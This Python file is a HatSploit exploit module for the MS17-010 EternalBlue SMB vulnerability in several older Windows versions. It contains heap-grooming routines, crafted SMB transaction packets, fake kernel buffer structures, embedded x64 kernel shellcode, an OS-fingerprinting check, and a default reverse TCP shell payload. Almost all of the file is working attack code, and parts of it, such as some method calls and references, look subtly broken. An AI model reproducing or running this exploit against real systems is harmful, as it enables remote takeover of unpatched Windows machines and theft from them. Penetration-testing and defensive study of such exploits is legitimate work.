"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import socket
from struct import pack

from hatsploit.lib.handler import Handler
from hatsploit.lib.module import Module
from hatsploit.lib.payloads import Payloads
from impacket import smb


class HatSploitModule(Module, Payloads, Handler):
    def __init__(self):
        super().__init__()

        self.details = {
            'Category': "exploit",
            'Name': "Windows SMB MS17-010 EternalBlue RCE",
            'Module': "exploit/windows/smb/ms17_010_eternalblue",
            'Authors': [
                'Ivan Nikolsky (enty8080) - module developer',
                'sleepya - vulnerability researcher',
                'sleepya - exploit developer',
            ],
            'Description': "Windows SMB MS17-010 EternalBlue Remote Code Execution.",
            'Platform': "windows",
            'Rank': "high",
        }

        self.payload = {
            'Value': "windows/x64/shell_reverse_tcp",
            'Categories': None,
            'Architectures': None,
            'Platforms': ['windows'],
            'Action': "memory",
            'Types': None,
            'Handler': 'reverse_tcp',
        }

        self.options = {
            'HOST': {
                'Description': "Remote host.",
                'Value': None,
                'Type': "ip",
                'Required': True,
            },
            'PORT': {
                'Description': "Remote host.",
                'Value': 445,
                'Type': "port",
                'Required': True,
            },
        }

    Windows7 = False
    Windows10 = False

    class Windows10Exploit:
        class SMBTransaction2Secondary_Parameters_Fixed(smb.SMBCommand_Parameters):
            structure = (
                ('TotalParameterCount', '<H=0'),
                ('TotalDataCount', '<H'),
                ('ParameterCount', '<H=0'),
                ('ParameterOffset', '<H=0'),
                ('ParameterDisplacement', '<H=0'),
                ('DataCount', '<H'),
                ('DataOffset', '<H'),
                ('DataDisplacement', '<H=0'),
                ('FID', '<H=0'),
            )

        def createFeaList(self, sc_size, ntfea9000, TARGET_HAL_HEAP_ADDR):
            feaList = pack('<I', 0x10000)
            feaList += ntfea9000

            totalRecvSize = 0x80 + 0x180 + sc_size
            fakeSrvNetBufferX64 = b'\x00' * 16
            fakeSrvNetBufferX64 += pack('<HHIQ', 0xFFF0, 0, 0, TARGET_HAL_HEAP_ADDR)
            fakeSrvNetBufferX64 += pack('<QII', 0, 0x82E8, 0)
            fakeSrvNetBufferX64 += b'\x00' * 16
            fakeSrvNetBufferX64 += pack('<QQ', 0, totalRecvSize)
            fakeSrvNetBufferX64 += pack(
                '<QQ', TARGET_HAL_HEAP_ADDR, TARGET_HAL_HEAP_ADDR
            )
            fakeSrvNetBufferX64 += pack('<QQ', 0, 0)
            fakeSrvNetBufferX64 += b'\x00' * 16
            fakeSrvNetBufferX64 += b'\x00' * 16
            fakeSrvNetBufferX64 += pack('<QHHI', 0, 0x60, 0x1004, 0)
            fakeSrvNetBufferX64 += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR - 0x80)

            fakeSrvNetBuf = fakeSrvNetBufferX64
            feaList += pack('<BBH', 0, 0, len(fakeSrvNetBuf) - 1) + fakeSrvNetBuf
            feaList += pack('<BBH', 0x12, 0x34, 0x5678)

            return feaList

        class MYSMB(smb.SMB):
            def __init__(self, remote_host, use_ntlmv2=True):
                self.__use_ntlmv2 = use_ntlmv2
                smb.SMB.__init__(self, remote_host, remote_host)

            def neg_session(self, extended_security=True, negPacket=None):
                smb.SMB.neg_session(
                    self, extended_security=self.__use_ntlmv2, negPacket=negPacket
                )

        def createSessionAllocNonPaged(target, size):
            conn = self.MYSMB(target, use_ntlmv2=False)
            _, flags2 = conn.get_flags()

            if size >= 0xFFFF:
                flags2 &= ~smb.SMB.FLAGS2_UNICODE
                reqSize = size // 2
            else:
                flags2 |= smb.SMB.FLAGS2_UNICODE
                reqSize = size
            conn.set_flags(flags2=flags2)

            pkt = smb.NewSMBPacket()

            sessionSetup = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)
            sessionSetup['Parameters'] = smb.SMBSessionSetupAndX_Extended_Parameters()

            sessionSetup['Parameters']['MaxBufferSize'] = 61440
            sessionSetup['Parameters']['MaxMpxCount'] = 2
            sessionSetup['Parameters']['VcNumber'] = 2
            sessionSetup['Parameters']['SessionKey'] = 0
            sessionSetup['Parameters']['SecurityBlobLength'] = 0
            sessionSetup['Parameters']['Capabilities'] = (
                    smb.SMB.CAP_EXTENDED_SECURITY | smb.SMB.CAP_USE_NT_ERRORS
            )

            sessionSetup['Data'] = pack('<H', reqSize) + b'\x00' * 20
            pkt.addCommand(sessionSetup)

            conn.sendSMB(pkt)
            recvPkt = conn.recvSMB()

            if recvPkt.getNTStatus() == 0:
                return conn

        def send_trans2_second(conn, tid, data, displacement):
            pkt = smb.NewSMBPacket()
            pkt['Tid'] = tid

            transCommand = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2_SECONDARY)
            transCommand['Parameters'] = SMBTransaction2Secondary_Parameters_Fixed()
            transCommand['Data'] = smb.SMBTransaction2Secondary_Data()

            transCommand['Parameters']['TotalParameterCount'] = 0
            transCommand['Parameters']['TotalDataCount'] = len(data)

            fixedOffset = 32 + 3 + 18
            transCommand['Data']['Pad1'] = b''

            transCommand['Parameters']['ParameterCount'] = 0
            transCommand['Parameters']['ParameterOffset'] = 0

            if len(data) > 0:
                pad2Len = (4 - fixedOffset % 4) % 4
                transCommand['Data']['Pad2'] = b'\xFF' * pad2Len
            else:
                transCommand['Data']['Pad2'] = b''
                pad2Len = 0

            transCommand['Parameters']['DataCount'] = len(data)
            transCommand['Parameters']['DataOffset'] = fixedOffset + pad2Len
            transCommand['Parameters']['DataDisplacement'] = displacement

            transCommand['Data']['Trans_Parameters'] = b''
            transCommand['Data']['Trans_Data'] = data
            pkt.addCommand(transCommand)

            conn.sendSMB(pkt)

        def send_big_trans2(
                conn, tid, setup, data, param, firstDataFragmentSize, sendLastChunk=True
        ):
            pkt = smb.NewSMBPacket()
            pkt['Tid'] = tid

            command = pack('<H', setup)

            transCommand = smb.SMBCommand(smb.SMB.SMB_COM_NT_TRANSACT)
            transCommand['Parameters'] = smb.SMBNTTransaction_Parameters()
            transCommand['Parameters']['MaxSetupCount'] = 1
            transCommand['Parameters']['MaxParameterCount'] = len(param)
            transCommand['Parameters']['MaxDataCount'] = 0
            transCommand['Data'] = smb.SMBTransaction2_Data()

            transCommand['Parameters']['Setup'] = command
            transCommand['Parameters']['TotalParameterCount'] = len(param)
            transCommand['Parameters']['TotalDataCount'] = len(data)

            fixedOffset = 32 + 3 + 38 + len(command)
            if len(param) > 0:
                padLen = (4 - fixedOffset % 4) % 4
                padBytes = b'\xFF' * padLen
                transCommand['Data']['Pad1'] = padBytes
            else:
                transCommand['Data']['Pad1'] = b''
                padLen = 0

            transCommand['Parameters']['ParameterCount'] = len(param)
            transCommand['Parameters']['ParameterOffset'] = fixedOffset + padLen

            if len(data) > 0:
                pad2Len = (4 - (fixedOffset + padLen + len(param)) % 4) % 4
                transCommand['Data']['Pad2'] = b'\xFF' * pad2Len
            else:
                transCommand['Data']['Pad2'] = b''
                pad2Len = 0

            transCommand['Parameters']['DataCount'] = firstDataFragmentSize
            transCommand['Parameters']['DataOffset'] = (
                    transCommand['Parameters']['ParameterOffset'] + len(param) + pad2Len
            )

            transCommand['Data']['Trans_Parameters'] = param
            transCommand['Data']['Trans_Data'] = data[:firstDataFragmentSize]
            pkt.addCommand(transCommand)

            conn.sendSMB(pkt)
            recvPkt = conn.recvSMB()

            i = firstDataFragmentSize
            while i < len(data):
                sendSize = min(4096, len(data) - i)
                if len(data) - i <= 4096:
                    if not sendLastChunk:
                        break
                self.send_trans2_second(conn, tid, data[i: i + sendSize], i)
                i += sendSize

            if sendLastChunk:
                conn.recvSMB()
            return i

        def createConnectionWithBigSMBFirst80(target, target_port, for_nx=False):
            sk = socket.create_connection((target, int(target_port)))
            pkt = b'\x00' + b'\x00' + pack('>H', 0x8100)

            pkt += b'BAAD'
            if for_nx:
                sk.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                pkt += b'\x00' * 0x7B
            else:
                pkt += b'\x00' * 0x7C
            sk.send(pkt)
            return sk

        def exploit(self, remote_host, remote_port, shellcode):
            def getNTStatus(self):
                return (
                        (self['ErrorCode'] << 16)
                        | (self['_reserved'] << 8)
                        | self['ErrorClass']
                )

            setattr(smb.NewSMBPacket, "getNTStatus", getNTStatus)

            NTFEA_SIZE = 0x9000
            numGroomConn = 13

            ntfea9000 = (pack('<BBH', 0, 0, 0) + b'\x00') * 0x260
            ntfea9000 += pack('<BBH', 0, 0, 0x735C) + b'\x00' * 0x735D
            ntfea9000 += pack('<BBH', 0, 0, 0x8147) + b'\x00' * 0x8148

            TARGET_HAL_HEAP_ADDR = 0xFFFFFFFFFFD04000
            SHELLCODE_PAGE_ADDR = (TARGET_HAL_HEAP_ADDR + 0x400) & 0xFFFFFFFFFFFFF000
            PTE_ADDR = 0xFFFFF6FFFFFFE800 + 8 * (
                    (SHELLCODE_PAGE_ADDR - 0xFFFFFFFFFFD00000) >> 12
            )

            fakeSrvNetBufferX64Nx = b'\x00' * 16
            fakeSrvNetBufferX64Nx += pack('<HHIQ', 0xFFF0, 0, 0, TARGET_HAL_HEAP_ADDR)
            fakeSrvNetBufferX64Nx += b'\x00' * 16
            fakeSrvNetBufferX64Nx += b'\x00' * 16
            fakeSrvNetBufferX64Nx += pack('<QQ', 0, 0)
            fakeSrvNetBufferX64Nx += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR)
            fakeSrvNetBufferX64Nx += pack('<QQ', 0, 0)
            fakeSrvNetBufferX64Nx += b'\x00' * 16
            fakeSrvNetBufferX64Nx += b'\x00' * 16
            fakeSrvNetBufferX64Nx += pack('<QHHI', 0, 0x60, 0x1004, 0)
            fakeSrvNetBufferX64Nx += pack('<QQ', 0, PTE_ADDR + 7 - 0x7F)

            feaListNx = pack('<I', 0x10000)
            feaListNx += ntfea9000
            feaListNx += (
                    pack('<BBH', 0, 0, len(fakeSrvNetBufferX64Nx) - 1)
                    + fakeSrvNetBufferX64Nx
            )
            feaListNx += pack('<BBH', 0x12, 0x34, 0x5678)

            fake_recv_struct = (b'\x00' * 16) * 5
            fake_recv_struct += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR + 0x58)
            fake_recv_struct += pack('<QQ', TARGET_HAL_HEAP_ADDR + 0x58, 0)
            fake_recv_struct += (b'\x00' * 16) * 10
            fake_recv_struct += pack('<QQ', TARGET_HAL_HEAP_ADDR + 0x170, 0)
            fake_recv_struct += pack('<QQ', (0x8150 ^ 0xFFFFFFFFFFFFFFFF) + 1, 0)
            fake_recv_struct += pack('<QII', 0, 0, 3)
            fake_recv_struct += (b'\x00' * 16) * 3
            fake_recv_struct += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR + 0x180)

            feaList = self.createFeaList(len(shellcode))
            conn = smb.SMB(remote_host, remote_host)
            conn.login('', '')

            tid = conn.tree_connect_andx('\\\\' + remote_host + '\\' + 'IPC$')
            progress = self.send_big_trans2(
                conn, tid, 0, feaList, b'\x00' * 30, len(feaList) % 4096, False
            )

            nxconn = smb.SMB(remote_host, remote_host)
            nxconn.login('', '')
            nxtid = nxconn.tree_connect_andx('\\\\' + remote_host + '\\' + 'IPC$')
            nxprogress = self.send_big_trans2(
                nxconn, nxtid, 0, feaListNx, b'\x00' * 30, len(feaList) % 4096, False
            )

            allocConn = createSessionAllocNonPaged(remote_host, NTFEA_SIZE - 0x2010)

            srvnetConn = []
            for i in range(numGroomConn):
                sk = self.createConnectionWithBigSMBFirst80(
                    remote_host, remote_port, for_nx=True
                )
                srvnetConn.append(sk)

            holeConn = self.createSessionAllocNonPaged(
                remote_host, remote_port, NTFEA_SIZE - 0x10
            )
            allocConn.get_socket().close()

            for i in range(5):
                sk = self.createConnectionWithBigSMBFirst80(
                    remote_host, remote_port, for_nx=True
                )
                srvnetConn.append(sk)

            holeConn.get_socket().close()

            self.send_trans2_second(nxconn, nxtid, feaListNx[nxprogress:], nxprogress)
            recvPkt = nxconn.recvSMB()

            for sk in srvnetConn:
                sk.send(b'\x00')

            self.send_trans2_second(conn, tid, feaList[progress:], progress)
            recvPkt = conn.recvSMB()

            for sk in srvnetConn:
                sk.send(fake_recv_struct + shellcode)

            for sk in srvnetConn:
                sk.close()

            nxconn.disconnect_tree(tid)
            nxconn.logoff()
            nxconn.get_socket().close()
            conn.disconnect_tree(tid)
            conn.logoff()
            conn.get_socket().close()

    class Windows7Exploit:
        class SMBTransaction2Secondary_Parameters_Fixed(smb.SMBCommand_Parameters):
            structure = (
                ('TotalParameterCount', '<H=0'),
                ('TotalDataCount', '<H'),
                ('ParameterCount', '<H=0'),
                ('ParameterOffset', '<H=0'),
                ('ParameterDisplacement', '<H=0'),
                ('DataCount', '<H'),
                ('DataOffset', '<H'),
                ('DataDisplacement', '<H=0'),
                ('FID', '<H=0'),
            )

        def createSessionAllocNonPaged(self, target, size):
            conn = smb.SMB(target, target)
            _, flags2 = conn.get_flags()

            flags2 &= ~smb.SMB.FLAGS2_EXTENDED_SECURITY

            if size >= 0xFFFF:
                flags2 &= ~smb.SMB.FLAGS2_UNICODE
                reqSize = size // 2
            else:
                flags2 |= smb.SMB.FLAGS2_UNICODE
                reqSize = size

            conn.set_flags(flags2=flags2)
            pkt = smb.NewSMBPacket()

            sessionSetup = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)
            sessionSetup['Parameters'] = smb.SMBSessionSetupAndX_Extended_Parameters()

            sessionSetup['Parameters']['MaxBufferSize'] = 61440
            sessionSetup['Parameters']['MaxMpxCount'] = 2
            sessionSetup['Parameters']['VcNumber'] = 2
            sessionSetup['Parameters']['SessionKey'] = 0
            sessionSetup['Parameters']['SecurityBlobLength'] = 0
            sessionSetup['Parameters']['Capabilities'] = smb.SMB.CAP_EXTENDED_SECURITY

            sessionSetup['Data'] = pack('<H', reqSize) + b'\x00' * 20
            pkt.addCommand(sessionSetup)

            conn.sendSMB(pkt)
            recvPkt = conn.recvSMB()

            return conn

        def send_trans2_second(self, conn, tid, data, displacement):
            pkt = smb.NewSMBPacket()
            pkt['Tid'] = tid

            transCommand = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2_SECONDARY)
            transCommand[
                'Parameters'
            ] = self.SMBTransaction2Secondary_Parameters_Fixed()
            transCommand['Data'] = smb.SMBTransaction2Secondary_Data()

            transCommand['Parameters']['TotalParameterCount'] = 0
            transCommand['Parameters']['TotalDataCount'] = len(data)

            fixedOffset = 32 + 3 + 18
            transCommand['Data']['Pad1'] = b''

            transCommand['Parameters']['ParameterCount'] = 0
            transCommand['Parameters']['ParameterOffset'] = 0

            if len(data) > 0:
                pad2Len = (4 - fixedOffset % 4) % 4
                transCommand['Data']['Pad2'] = b'\xFF' * pad2Len
            else:
                transCommand['Data']['Pad2'] = b''
                pad2Len = 0

            transCommand['Parameters']['DataCount'] = len(data)
            transCommand['Parameters']['DataOffset'] = fixedOffset + pad2Len
            transCommand['Parameters']['DataDisplacement'] = displacement

            transCommand['Data']['Trans_Parameters'] = b''
            transCommand['Data']['Trans_Data'] = data

            pkt.addCommand(transCommand)
            conn.sendSMB(pkt)

        def send_big_trans2(
                self,
                conn,
                tid,
                setup,
                data,
                param,
                firstDataFragmentSize,
                sendLastChunk=True,
        ):
            pkt = smb.NewSMBPacket()
            pkt['Tid'] = tid

            command = pack('<H', setup)

            transCommand = smb.SMBCommand(smb.SMB.SMB_COM_NT_TRANSACT)
            transCommand['Parameters'] = smb.SMBNTTransaction_Parameters()
            transCommand['Parameters']['MaxSetupCount'] = 1
            transCommand['Parameters']['MaxParameterCount'] = len(param)
            transCommand['Parameters']['MaxDataCount'] = 0
            transCommand['Data'] = smb.SMBTransaction2_Data()

            transCommand['Parameters']['Setup'] = command
            transCommand['Parameters']['TotalParameterCount'] = len(param)
            transCommand['Parameters']['TotalDataCount'] = len(data)

            fixedOffset = 32 + 3 + 38 + len(command)
            if len(param) > 0:
                padLen = (4 - fixedOffset % 4) % 4
                padBytes = b'\xFF' * padLen
                transCommand['Data']['Pad1'] = padBytes
            else:
                transCommand['Data']['Pad1'] = b''
                padLen = 0

            transCommand['Parameters']['ParameterCount'] = len(param)
            transCommand['Parameters']['ParameterOffset'] = fixedOffset + padLen

            if len(data) > 0:
                pad2Len = (4 - (fixedOffset + padLen + len(param)) % 4) % 4
                transCommand['Data']['Pad2'] = b'\xFF' * pad2Len
            else:
                transCommand['Data']['Pad2'] = b''
                pad2Len = 0

            transCommand['Parameters']['DataCount'] = firstDataFragmentSize
            transCommand['Parameters']['DataOffset'] = (
                    transCommand['Parameters']['ParameterOffset'] + len(param) + pad2Len
            )

            transCommand['Data']['Trans_Parameters'] = param
            transCommand['Data']['Trans_Data'] = data[:firstDataFragmentSize]
            pkt.addCommand(transCommand)

            conn.sendSMB(pkt)
            conn.recvSMB()

            i = firstDataFragmentSize
            while i < len(data):
                sendSize = min(4096, len(data) - i)
                if len(data) - i <= 4096:
                    if not sendLastChunk:
                        break
                self.send_trans2_second(conn, tid, data[i: i + sendSize], i)
                i += sendSize

            if sendLastChunk:
                conn.recvSMB()
            return i

        def createConnectionWithBigSMBFirst80(self, target, target_port):
            sk = socket.create_connection((target, int(target_port)))

            pkt = b'\x00' + b'\x00' + pack('>H', 0xFFF7)
            pkt += b'BAAD'
            pkt += b'\x00' * 0x7C

            sk.send(pkt)
            return sk

        def exploit(self, remote_host, remote_port, shellcode):
            def getNTStatus(self):
                return (
                        (self['ErrorCode'] << 16)
                        | (self['_reserved'] << 8)
                        | self['ErrorClass']
                )

            setattr(smb.NewSMBPacket, "getNTStatus", getNTStatus)

            NTFEA_SIZE = 0x11000

            ntfea10000 = pack('<BBH', 0, 0, 0xFFDD) + b'A' * 0xFFDE
            ntfea11000 = (pack('<BBH', 0, 0, 0) + b'\x00') * 600

            ntfea11000 += pack('<BBH', 0, 0, 0xF3BD) + b'A' * 0xF3BE
            ntfea1f000 = (pack('<BBH', 0, 0, 0) + b'\x00') * 0x2494
            ntfea1f000 += pack('<BBH', 0, 0, 0x48ED) + b'A' * 0x48EE

            numGroomConn = 13
            ntfea = {0x10000: ntfea10000, 0x11000: ntfea11000}

            TARGET_HAL_HEAP_ADDR_x64 = 0xFFFFFFFFFFD00010
            TARGET_HAL_HEAP_ADDR_x86 = 0xFFDFF000

            fakeSrvNetBufferNsa = pack('<II', 0x11000, 0) * 2
            fakeSrvNetBufferNsa += pack('<HHI', 0xFFFF, 0, 0) * 2
            fakeSrvNetBufferNsa += b'\x00' * 16
            fakeSrvNetBufferNsa += pack(
                '<IIII',
                TARGET_HAL_HEAP_ADDR_x86 + 0x100,
                0,
                0,
                TARGET_HAL_HEAP_ADDR_x86 + 0x20,
            )
            fakeSrvNetBufferNsa += pack(
                '<IIHHI', TARGET_HAL_HEAP_ADDR_x86 + 0x100, 0, 0x60, 0x1004, 0
            )
            fakeSrvNetBufferNsa += pack(
                '<IIQ', TARGET_HAL_HEAP_ADDR_x86 - 0x80, 0, TARGET_HAL_HEAP_ADDR_x64
            )
            fakeSrvNetBufferNsa += pack('<QQ', TARGET_HAL_HEAP_ADDR_x64 + 0x100, 0)
            fakeSrvNetBufferNsa += pack('<QHHI', 0, 0x60, 0x1004, 0)
            fakeSrvNetBufferNsa += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64 - 0x80)

            fakeSrvNetBuffer = fakeSrvNetBufferNsa
            feaList = pack('<I', 0x10000)
            feaList += ntfea[NTFEA_SIZE]
            feaList += pack('<BBH', 0, 0, len(fakeSrvNetBuffer) - 1) + fakeSrvNetBuffer
            feaList += pack('<BBH', 0x12, 0x34, 0x5678)

            fake_recv_struct = pack('<QII', 0, 3, 0)
            fake_recv_struct += b'\x00' * 16
            fake_recv_struct += pack('<QII', 0, 3, 0)
            fake_recv_struct += (b'\x00' * 16) * 7
            fake_recv_struct += pack(
                '<QQ', TARGET_HAL_HEAP_ADDR_x64 + 0xA0, TARGET_HAL_HEAP_ADDR_x64 + 0xA0
            )
            fake_recv_struct += b'\x00' * 16
            fake_recv_struct += pack(
                '<IIQ',
                TARGET_HAL_HEAP_ADDR_x86 + 0xC0,
                TARGET_HAL_HEAP_ADDR_x86 + 0xC0,
                0,
            )
            fake_recv_struct += (b'\x00' * 16) * 11
            fake_recv_struct += pack('<QII', 0, 0, TARGET_HAL_HEAP_ADDR_x86 + 0x190)
            fake_recv_struct += pack('<IIQ', 0, TARGET_HAL_HEAP_ADDR_x86 + 0x1F0 - 1, 0)
            fake_recv_struct += (b'\x00' * 16) * 3
            fake_recv_struct += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64 + 0x1E0)
            fake_recv_struct += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64 + 0x1F0 - 1)

            conn = smb.SMB(remote_host, remote_host)
            conn.login_standard('', '')

            tid = conn.tree_connect_andx('\\\\' + remote_host + '\\' + 'IPC$')
            progress = self.send_big_trans2(
                conn, tid, 0, feaList, b'\x00' * 30, 2000, False
            )

            allocConn = self.createSessionAllocNonPaged(
                remote_host, NTFEA_SIZE - 0x1010
            )
            srvnetConn = []

            for i in range(numGroomConn):
                sk = self.createConnectionWithBigSMBFirst80(remote_host, remote_port)
                srvnetConn.append(sk)

            holeConn = self.createSessionAllocNonPaged(remote_host, NTFEA_SIZE - 0x10)
            allocConn.get_socket().close()

            for i in range(5):
                sk = self.createConnectionWithBigSMBFirst80(remote_host, remote_port)
                srvnetConn.append(sk)

            holeConn.get_socket().close()

            self.send_trans2_second(conn, tid, feaList[progress:], progress)
            recvPkt = conn.recvSMB()

            for sk in srvnetConn:
                sk.send(fake_recv_struct + shellcode)

            for sk in srvnetConn:
                sk.close()

            conn.disconnect_tree(tid)
            conn.logoff()
            conn.get_socket().close()

    def exploit(self, remote_host, remote_port, payload):
        kernel_sc = (
            b"\x55\xe8\x2e\x00\x00\x00\xb9\x82\x00\x00\xc0\x0f\x32\x4c\x8d"
            b"\x0d\x34\x00\x00\x00\x44\x39\xc8\x74\x19\x39\x45\x00\x74\x0a"
            b"\x89\x55\x04\x89\x45\x00\xc6\x45\xf8\x00\x49\x91\x50\x5a\x48"
            b"\xc1\xea\x20\x0f\x30\x5d\xc3\x48\x8d\x2d\x00\x10\x00\x00\x48"
            b"\xc1\xed\x0c\x48\xc1\xe5\x0c\x48\x83\xed\x70\xc3\x0f\x01\xf8"
            b"\x65\x48\x89\x24\x25\x10\x00\x00\x00\x65\x48\x8b\x24\x25\xa8"
            b"\x01\x00\x00\x6a\x2b\x65\xff\x34\x25\x10\x00\x00\x00\x50\x50"
            b"\x55\xe8\xc5\xff\xff\xff\x48\x8b\x45\x00\x48\x83\xc0\x1f\x48"
            b"\x89\x44\x24\x10\x51\x52\x41\x50\x41\x51\x41\x52\x41\x53\x31"
            b"\xc0\xb2\x01\xf0\x0f\xb0\x55\xf8\x75\x14\xb9\x82\x00\x00\xc0"
            b"\x8b\x45\x00\x8b\x55\x04\x0f\x30\xfb\xe8\x0e\x00\x00\x00\xfa"
            b"\x41\x5b\x41\x5a\x41\x59\x41\x58\x5a\x59\x5d\x58\xc3\x41\x57"
            b"\x41\x56\x57\x56\x53\x50\x4c\x8b\x7d\x00\x49\xc1\xef\x0c\x49"
            b"\xc1\xe7\x0c\x49\x81\xef\x00\x10\x00\x00\x66\x41\x81\x3f\x4d"
            b"\x5a\x75\xf1\x4c\x89\x7d\x08\x65\x4c\x8b\x34\x25\x88\x01\x00"
            b"\x00\xbf\x78\x7c\xf4\xdb\xe8\x01\x01\x00\x00\x48\x91\xbf\x3f"
            b"\x5f\x64\x77\xe8\xfc\x00\x00\x00\x8b\x40\x03\x89\xc3\x3d\x00"
            b"\x04\x00\x00\x72\x03\x83\xc0\x10\x48\x8d\x50\x28\x4c\x8d\x04"
            b"\x11\x4d\x89\xc1\x4d\x8b\x09\x4d\x39\xc8\x0f\x84\xc6\x00\x00"
            b"\x00\x4c\x89\xc8\x4c\x29\xf0\x48\x3d\x00\x07\x00\x00\x77\xe6"
            b"\x4d\x29\xce\xbf\xe1\x14\x01\x17\xe8\xbb\x00\x00\x00\x8b\x78"
            b"\x03\x83\xc7\x08\x48\x8d\x34\x19\xe8\xf4\x00\x00\x00\x3d\x5a"
            b"\x6a\xfa\xc1\x74\x10\x3d\xd8\x83\xe0\x3e\x74\x09\x48\x8b\x0c"
            b"\x39\x48\x29\xf9\xeb\xe0\xbf\x48\xb8\x18\xb8\xe8\x84\x00\x00"
            b"\x00\x48\x89\x45\xf0\x48\x8d\x34\x11\x48\x89\xf3\x48\x8b\x5b"
            b"\x08\x48\x39\xde\x74\xf7\x4a\x8d\x14\x33\xbf\x3e\x4c\xf8\xce"
            b"\xe8\x69\x00\x00\x00\x8b\x40\x03\x48\x83\x7c\x02\xf8\x00\x74"
            b"\xde\x48\x8d\x4d\x10\x4d\x31\xc0\x4c\x8d\x0d\xa9\x00\x00\x00"
            b"\x55\x6a\x01\x55\x41\x50\x48\x83\xec\x20\xbf\xc4\x5c\x19\x6d"
            b"\xe8\x35\x00\x00\x00\x48\x8d\x4d\x10\x4d\x31\xc9\xbf\x34\x46"
            b"\xcc\xaf\xe8\x24\x00\x00\x00\x48\x83\xc4\x40\x85\xc0\x74\xa3"
            b"\x48\x8b\x45\x20\x80\x78\x1a\x01\x74\x09\x48\x89\x00\x48\x89"
            b"\x40\x08\xeb\x90\x58\x5b\x5e\x5f\x41\x5e\x41\x5f\xc3\xe8\x02"
            b"\x00\x00\x00\xff\xe0\x53\x51\x56\x41\x8b\x47\x3c\x41\x8b\x84"
            b"\x07\x88\x00\x00\x00\x4c\x01\xf8\x50\x8b\x48\x18\x8b\x58\x20"
            b"\x4c\x01\xfb\xff\xc9\x8b\x34\x8b\x4c\x01\xfe\xe8\x1f\x00\x00"
            b"\x00\x39\xf8\x75\xef\x58\x8b\x58\x24\x4c\x01\xfb\x66\x8b\x0c"
            b"\x4b\x8b\x58\x1c\x4c\x01\xfb\x8b\x04\x8b\x4c\x01\xf8\x5e\x59"
            b"\x5b\xc3\x52\x31\xc0\x99\xac\xc1\xca\x0d\x01\xc2\x85\xc0\x75"
            b"\xf6\x92\x5a\xc3\x55\x53\x57\x56\x41\x57\x49\x8b\x28\x4c\x8b"
            b"\x7d\x08\x52\x5e\x4c\x89\xcb\x31\xc0\x44\x0f\x22\xc0\x48\x89"
            b"\x02\x89\xc1\x48\xf7\xd1\x49\x89\xc0\xb0\x40\x50\xc1\xe0\x06"
            b"\x50\x49\x89\x01\x48\x83\xec\x20\xbf\xea\x99\x6e\x57\xe8\x65"
            b"\xff\xff\xff\x48\x83\xc4\x30\x85\xc0\x75\x45\x48\x8b\x3e\x48"
            b"\x8d\x35\x4d\x00\x00\x00\xb9\x00\x06\x00\x00\xf3\xa4\x48\x8b"
            b"\x45\xf0\x48\x8b\x40\x18\x48\x8b\x40\x20\x48\x8b\x00\x66\x83"
            b"\x78\x48\x18\x75\xf6\x48\x8b\x50\x50\x81\x7a\x0c\x33\x00\x32"
            b"\x00\x75\xe9\x4c\x8b\x78\x20\xbf\x5e\x51\x5e\x83\xe8\x22\xff"
            b"\xff\xff\x48\x89\x03\x31\xc9\x88\x4d\xf8\xb1\x01\x44\x0f\x22"
            b"\xc1\x41\x5f\x5e\x5f\x5b\x5d\xc3\x48\x92\x31\xc9\x51\x51\x49"
            b"\x89\xc9\x4c\x8d\x05\x0d\x00\x00\x00\x89\xca\x48\x83\xec\x20"
            b"\xff\xd0\x48\x83\xc4\x30\xc3"
        )

        shellcode = kernel_sc + payload

        if self.Windows7:
            self.Windows7Exploit().exploit(remote_host, remote_port, shellcode)
        elif self.Windows10:
            self.Windows10Exploit().exploit(remote_host, remote_port, shellcode)

    def check(self):
        remote_host, _ = self.parse_options(self.options)

        conn = smb.SMB(remote_host, remote_host)
        conn.login_standard('', '')

        server_os = conn.get_server_os()
        if server_os.startswith("Windows 7 ") or (
                server_os.startswith("Windows Server ") and ' 2008 ' in server_os
        ):
            self.Windows7 = True

        elif server_os.startswith("Windows 10 "):
            build = int(server_os.split()[-1])
            if build < 14393:
                self.Windows10 = True

        elif server_os.startswith("Windows 8") or server_os.startswith(
                "Windows Server 2012 "
        ):
            self.Windows10 = True

        conn.logoff()
        conn.get_socket().close()

        if self.Windows7 or self.Windows10:
            return True

        return False

    def run(self):
        remote_host, remote_port = self.parse_options(self.options)

        self.module_handle(
            module=self,
            sender=self.exploit,
            space=2048,
            remote_host=remote_host,
            remote_port=remote_port,
        )
